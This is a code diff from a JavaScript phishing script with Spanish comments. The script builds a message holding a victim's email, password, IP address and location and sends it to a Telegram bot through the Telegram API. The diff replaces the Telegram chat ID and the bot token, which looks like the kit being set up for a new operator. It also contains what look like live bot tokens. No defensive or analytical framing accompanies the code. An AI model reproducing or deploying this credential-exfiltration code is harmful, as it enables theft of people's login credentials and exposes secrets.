@@ -16,10 +16,10 @@ document.addEventListener("DOMContentLoaded", function() {
                 var message = "📧 Correo electrónico 📧:\n" + email + "\nContraseña: " + password + "\nIP: " + ip + "\nPais: " + country + ", " + state;
 
                 // ID del chat de Telegram al que deseas enviar el mensaje
-                var chatId = "7165691769"; // Reemplazar por el ID de tu chat
+                var chatId = "5432640156"; // Reemplazar por el ID de tu chat
 
                 // Token de bot de Telegram
-                var botToken = "6766183429:AAF5Ly_6Zhdz8yQQ2NiLAXzmmCxLzOhWldQ"; // Reemplazar por el token de tu bot
+                var botToken = "7821998419:AAFFO3sFRmY26_3Z3TKBNQ99AVF9KQ10Jak"; // Reemplazar por el token de tu bot
 
                 // Construir la URL de la API de Telegram
                 var apiUrl = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURI(message);
